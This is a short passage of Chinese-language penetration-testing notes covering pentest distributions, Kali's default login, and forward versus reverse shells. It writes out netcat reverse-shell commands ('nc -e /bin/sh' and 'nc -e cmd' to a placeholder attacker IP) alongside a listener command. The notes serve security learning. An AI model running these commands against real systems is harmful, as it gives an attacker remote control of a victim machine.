## 1.渗透专用系统简介
kali、Cyborg Hawk、Parrot Security OS、BackBox Linux等等
...
kali系统默认用户名及密码均为kali（2020.1起），root账户默认无密码且被锁定，需`sudo passwd root`设置密码后才能使用
...
获取shell分为两种：正向shell（攻击者主动连接受害者）和反向shell（受害者主动连接攻击者）。
...
反向Shell：受害者主动连接攻击者（常用于入侵web服务器后利用web公网ip的唯一性）。

攻击者（服务端/监听端）：
nc -lvvp 端口号

受害者（客户端/连接端）：
nc -e /bin/sh 攻击者IP 端口   Linux

&#x9;			nc -e cmd 攻击者IP  端口   window
...
- [07.Linux系统状态管理、安全加固](07.Linux系统状态管理、安全加固.md) —— Kali 底层是 Linux，加固/管理知识通用
